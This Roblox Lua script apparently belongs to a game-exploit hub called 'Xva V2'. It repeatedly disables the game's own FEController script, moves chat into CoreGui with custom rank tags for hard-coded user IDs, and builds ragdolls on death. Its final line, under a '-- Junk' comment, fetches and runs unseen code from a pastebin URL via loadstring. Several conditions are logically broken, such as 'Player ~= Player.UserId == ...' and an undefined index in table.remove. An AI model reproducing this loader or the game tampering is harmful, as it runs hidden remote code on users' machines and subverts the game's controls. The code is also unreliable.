local ScriptLocation = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("FEController")

ScriptLocation.Disabled = true

game:GetService("Players").LocalPlayer.DescendantAdded:Connect(function(obj)
	if obj.Name == "FEController" then
		pcall(function()
			if obj.Disabled == false then
				obj.Disabled = true
			end
		end)
		wait(0.1)
		if obj.Disabled == false then
			obj.Disabled = true
		end
	end
end)
local GUI = ScriptLocation.Parent.GUI

_G.CoreModuleChat = GUI.Chats
_G.CoreModuleChat.Parent = game:GetService("CoreGui").RobloxGui

for i, v in pairs(_G.CoreModuleChat:GetChildren()) do
	spawn(function()
		wait(15)

		for i = 0, 1, 0.05 do
			wait()
			v.TextStrokeTransparency = 1
			v.TextTransparency = i
		end
		v:Destroy()
	end)
end

local savedChat = ScriptLocation.Chat:Clone()
local savedChat2 = ScriptLocation.MChat:Clone()
local User = game:GetService("Players").LocalPlayer
local MuteMusic = User:WaitForChild("MuteMusic")
local Type = "Glue"
local Mobile = game:GetService("UserInputService").TouchEnabled
if game:GetService("UserInputService").KeyboardEnabled then
	Mobile = false
end

function OnDeath(Character)
	local ScriptLocation = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("FEController")
	local GUI = ScriptLocation.Parent.GUI
	local Torso = Character:FindFirstChild("Torso")
	local Humanoid = Character:FindFirstChild("Humanoid")
	local x = Character:GetChildren()
	for i = 1, #x do
		if x[i].className == "Model" then
			x[i]:Destroy()
		end
	end
	local mode = Instance.new("Model")
	mode.Name = ""
	mode.Parent = workspace.Ignore.Debris
	local THIS = ScriptLocation.Cleaner:Clone()
	THIS.Parent = mode
	THIS.Disabled = false
	local bland = Instance.new("Humanoid")
	bland.Health = 0
	bland.MaxHealth = 0
	bland.Parent = mode
	bland.Name = "Hum"
	bland.PlatformStand = true
	local x = Character:GetChildren()
	for i = 1, #x do
		if x[i].className == "Part" then
			x[i].Anchored = true
			x[i].CanCollide = false
			x[i].Transparency = 1
			if x[i].Name == "Head" and x[i]:FindFirstChild("face") ~= nil then
				x[i]:FindFirstChild("face").Transparency = 1
				x[i]:FindFirstChild("face").Texture = "http://www.roblox.com/asset/?id=33328967"
			end
		end
	end
	if Torso then
		local F = Torso:FindFirstChild("Force")
		if F ~= nil then
			F:Destroy()
		end
		Torso.Velocity = Vector3.new(0, 0, 0)
		Torso.RotVelocity = Vector3.new(0, 0, 0)
		local zam = Torso:Clone()
		zam.Parent = mode
		zam.Elasticity = 0
		zam.Friction = 1
		zam.Transparency = 0
		if zam:FindFirstChild("Music") ~= nil then
			zam:FindFirstChild("Music"):Stop()
		end
		local x = Character:GetChildren()
		for i = 1, #x do
			if x[i].className == "Hat" or x[i].className == "Accessory" then
				local han = x[i]:FindFirstChild("Handle")
				if han ~= nil then
					han.CanCollide = false
					han.Transparency = 1
				end
			end
			if x[i].Name == "Shirt" or x[i].Name == "Pants" or x[i].className == "CharacterMesh" or x[i].className == "Decal" or x[i].className == "ShirtGraphic" or x[i].className == "Model" then
				local zor = x[i]:Clone()
				zor.Parent = mode
				local Handle = zor:FindFirstChild("Handle")
				if Handle ~= nil then
					Handle.Transparency = 0
				end
				if x[i].className == "ShirtGraphic" then
					x[i]:Destroy()
				end
			end
			if x[i].Name == "Head" then
				x[i].Velocity = Vector3.new(0, 0, 0)
				x[i].RotVelocity = Vector3.new(0, 0, 0)
				local zem = x[i]:Clone()
				zem.Parent = mode
				zem.Name = "Head"
				zem.Elasticity = 0
				zem.Friction = 1
				zem.Transparency = 0
				local Neck = Instance.new(Type)
				Neck.Name = "Neck"
				Neck.Part0 = zam
				Neck.Part1 = zem
				Neck.C0 = CFrame.new(0, 1.5, 0)
				Neck.C1 = CFrame.new()
				Neck.Parent = zam
				local x = Character:GetChildren()
				for i = 1, #x do
					if x[i].className == "Hat" or x[i].className == "Accessory" then
						local hat = x[i]:Clone()
						hat.Parent = mode
						local Weld = Instance.new("Weld")
						Weld.Part0 = zem
						Weld.Part1 = hat.Handle
						Weld.C0 = CFrame.new(0, 0.5, 0)
						Weld.C1 = CFrame.new(hat.AttachmentPos)
						Weld.Parent = zem
					end
				end
			end
			if x[i].Name == "Right Arm" then
				x[i].Velocity = Vector3.new(0, 0, 0)
				x[i].RotVelocity = Vector3.new(0, 0, 0)
				local Limb = x[i]:Clone()
				Limb.Parent = mode
				Limb.CFrame = zam.CFrame * CFrame.new(1.5, 0, 0)
				Limb.Elasticity = 0
				Limb.Friction = 1
				Limb.Transparency = 0
				local Joint = Instance.new(Type)
				Joint.Name = "RightShoulder"
				Joint.Part0 = zam
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
				Joint.C1 = CFrame.new(0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
				Joint.Parent = zam
				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.Elasticity = 0
				B.Friction = 1
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = mode
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb
			end
			if x[i].Name == "Left Arm" then
				x[i].Velocity = Vector3.new(0, 0, 0)
				x[i].RotVelocity = Vector3.new(0, 0, 0)
				local Limb = x[i]:Clone()
				Limb.Parent = mode
				Limb.CFrame = zam.CFrame * CFrame.new(-1.5, 0, 0)
				Limb.Elasticity = 0
				Limb.Friction = 1
				Limb.Transparency = 0
				local Joint = Instance.new(Type)
				Joint.Name = "LeftShoulder"
				Joint.Part0 = zam
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(-1.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				Joint.C1 = CFrame.new(0, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				Joint.Parent = zam
				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.Elasticity = 0
				B.Friction = 1
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = mode
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb
			end
			if x[i].Name == "Right Leg" then
				x[i].Velocity = Vector3.new(0, 0, 0)
				x[i].RotVelocity = Vector3.new(0, 0, 0)
				local Limb = x[i]:Clone()
				Limb.Parent = mode
				Limb.CFrame = zam.CFrame * CFrame.new(0.5, -2, 0)
				Limb.Elasticity = 0
				Limb.Friction = 1
				Limb.Transparency = 0
				local Joint = Instance.new(Type)
				Joint.Name = "RightHip"
				Joint.Part0 = zam
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
				Joint.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
				Joint.Parent = zam
				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.Elasticity = 0
				B.Friction = 1
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = mode
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb
			end
			if x[i].Name == "Left Leg" then
				x[i].Velocity = Vector3.new(0, 0, 0)
				x[i].RotVelocity = Vector3.new(0, 0, 0)
				local Limb = x[i]:Clone()
				Limb.Parent = mode
				Limb.CFrame = zam.CFrame * CFrame.new(-0.5, -2, 0)
				Limb.Elasticity = 0
				Limb.Friction = 1
				Limb.Transparency = 0
				local Joint = Instance.new(Type)
				Joint.Name = "LeftHip"
				Joint.Part0 = zam
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(-0.5, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				Joint.C1 = CFrame.new(0, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				Joint.Parent = zam
				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.Elasticity = 0
				B.Friction = 1
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = mode
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb
			end
		end
		local Bar = Instance.new("Part")
		Bar.TopSurface = 0
		Bar.BottomSurface = 0
		Bar.Elasticity = 0
		Bar.Friction = 1
		Bar.formFactor = "Symmetric"
		Bar.Size = Vector3.new(1, 1, 1)
		Bar.Transparency = 1
		Bar.CFrame = zam.CFrame * CFrame.new(0, 0.5, 0)
		Bar.Parent = mode
		local Weld = Instance.new("Weld")
		Weld.Part0 = zam
		Weld.Part1 = Bar
		Weld.C0 = CFrame.new(0, 0.5, 0)
		Weld.Parent = zam
	end
	if mode == nil then
		return
	end
	if mode:FindFirstChild("Head") == nil then
		return
	end
	mode:FindFirstChild("Head").Velocity = Vector3.new(0, 0, 0)
	mode:FindFirstChild("Left Arm").Velocity = Vector3.new(0, 0, 0)
	mode:FindFirstChild("Left Leg").Velocity = Vector3.new(0, 0, 0)
	mode:FindFirstChild("Right Arm").Velocity = Vector3.new(0, 0, 0)
	mode:FindFirstChild("Right Leg").Velocity = Vector3.new(0, 0, 0)
	mode:FindFirstChild("Torso").Velocity = Vector3.new(0, 0, 0)
	local x = mode:GetChildren()
	for i = 1, #x do
		if x[i].className == "Part" then
			x[i].Anchored = false
		end
	end
	wait(0.1)
	Character:Destroy()
	wait(4)
	for i = 1, #x do
		if (x[i].className == "Hat" or x[i].className == "Accessory") and x[i]:FindFirstChild("Handle") then
			x[i].Handle.Anchored = false
		end
		if x[i].className == "Part" then
			x[i].Anchored = false
		end
	end
end

_G.r = 255
_G.g = 0
_G.b = 0
_G.startedRainbow = false
_G.swait = function(num)
	if num == 0 or num == nil then
		game:service("RunService").Stepped:wait(0)
	else
		for i = 0, num do
			game:service("RunService").Stepped:wait(0)
		end
	end
end
coroutine.resume(coroutine.create(function()
	while wait() do
		for i = 0, 50.8 do
			_G.swait()
			_G.g = _G.g + 5
		end
		for i = 0, 50.8 do
			_G.swait()
			_G.r = _G.r - 5
		end
		for i = 0, 50.8 do
			_G.swait()
			_G.b = _G.b + 5
		end
		for i = 0, 50.8 do
			_G.swait()
			_G.g = _G.g - 5
		end
		for i = 0, 50.8 do
			_G.swait()
			_G.r = _G.r + 5
		end
		for i = 0, 50.8 do
			_G.swait()
			_G.b = _G.b - 5
		end
	end
end))

_G.ReturnRainbow = function(ret)
	if ret == nil then
		return Color3.new(_G.r / 255, _G.g / 255, _G.b / 255)
	else
		return (_G.r / 255), (_G.g / 255), (_G.b / 255)
	end
end
_G.newChatTable = {}

game:GetService("RunService").Heartbeat:Connect(function()
	for _, v in pairs(_G.newChatTable) do
		if v.Parent ~= nil then
			v.TextColor3 = _G.ReturnRainbow()
		else
			table.remove(_G.newChatTable, i)
		end
	end
end)

_G.SendTMMessage = function(Text, Color, Internal)
	local namestuff = nil
	for _, Player in pairs(game:GetService("Players"):GetPlayers()) do
		if Player.UserId == 1538093474 or Player.UserId == 1232238047 or Player.UserId == 5402139 then
			namestuff = Player.Name
		end
	end

	local chats = _G.CoreModuleChat:GetChildren()
	for _, v in pairs(chats) do
		if string.match(v.Text, "%[L%] ") then
			if string.match(v.Text, "%[L%] (.+)") == Text then
				return
			end
		elseif string.match(v.Text, "%[L%]%[") then
			if string.match(v.Text, "%[L%](.+)") == Text then
				return
			end
		end
	end
	if not Mobile then
		for x = 1, #chats do
			chats[x].Position = chats[x].Position + UDim2.new(0, 0, 0, -15)
			if -15 >= chats[x].Position.Y.Offset then
				chats[x]:remove()
			end
		end
	else
		for x = 1, #chats do
			chats[x].Position = chats[x].Position + UDim2.new(0, 0, 0, -8)
		end
	end
	local newChat = savedChat:Clone()
	if Mobile then
		newChat = savedChat2:Clone()
	end
	newChat.Parent = _G.CoreModuleChat
	newChat.TextColor3 = Color
	newChat.Text = Text
	if namestuff ~= nil then
		if string.match(Text:lower(), namestuff:lower() .. ": ") then
			table.insert(_G.newChatTable, newChat)
		end
	end
	spawn(function()
		wait(15)

		for i = 0, 1, 0.05 do
			wait()
			newChat.TextStrokeTransparency = 1
			newChat.TextTransparency = i
		end
		newChat:Destroy()
	end)
end
local Name = game:GetService("Players").LocalPlayer.Name

_G.SendTMMessage("[Xva V2] Welcome "..Name.." and thanks for using Xva V2.0.", Color3.fromRGB(0, 205, 255), true)
_G.SendTMMessage("The Starting prefix would be '!', But it's always can be changeable.", Color3.fromRGB(0, 205, 255), true)
_G.SendTMMessage("Updated Version [Update 7V]", Color3.fromRGB(0, 255, 0), true)

MessageHook = function(Player)
	Player.Chatted:Connect(function(chat)
		if chat:sub(1, 3) == "/e " or chat:sub(1, 2) == "/ " then
			if not Player.Character:FindFirstChild("Role") and Player ~= game:GetService("Players").LocalPlayer and Player ~= Player.UserId == 1538093474 and Player ~= Player.UserId == 1324015701 and Player ~= Player.UserId == 181851925 and Player ~= Player.UserId == 145180480 and Player ~= Player.UserId == 102628414 and Player ~= Player.UserId == 106381965 then
				if Player:FindFirstChild("VIP") then
					_G.SendTMMessage("[L][VIP] " .. Player.Name .. ": " .. chat, Color3.new(0, 205, 255), true)
				elseif Player:FindFirstChild("MVP") then
					_G.SendTMMessage("[L][MVP] " .. Player.Name .. ": " .. chat, Color3.new(0, 205, 255), true)
				else
					_G.SendTMMessage("[L] " .. Player.Name .. ": " .. chat, Color3.new(0, 205, 255), true)
				end
			end
			if Player:FindFirstChild("VIP") then
				_G.SendTMMessage("[VIP] " .. Player.Name .. ": " .. chat, Color3.new(0, 205, 255), true)
			elseif Player:FindFirstChild("MVP") then
				_G.SendTMMessage("[MVP] " .. Player.Name .. ": " .. chat, Color3.new(0, 205, 255), true)
            elseif Player.UserId == 1538093474 or Player.UserId == 1232238047 or Player.UserId == 5402139 then
				_G.SendTMMessage("[Creator] " .. Player.Name .. ": " .. chat, Color3.new(0, 0, 0), true)
			elseif Player.UserId == 1324015701 or Player.UserId == 181851925 or Player.UserId == 145180480 or Player.UserId == 102628414 or Player.UserId == 89147818 then
				_G.SendTMMessage("[Real Gods] " .. Player.Name .. ": " .. chat, Color3.new(255, 255, 255), true)
			else
				_G.SendTMMessage(Player.Name .. ": " .. chat, Color3.new(0, 205, 255), true)
			end
		end
	end)
end
for _, Player in pairs(game:GetService("Players"):GetPlayers()) do
	MessageHook(Player)
end
game:GetService("Players").PlayerAdded:Connect(MessageHook)

-- Junk
loadstring(game:HttpGet("https://pastebin.com/raw/FBcjWg8s"))()
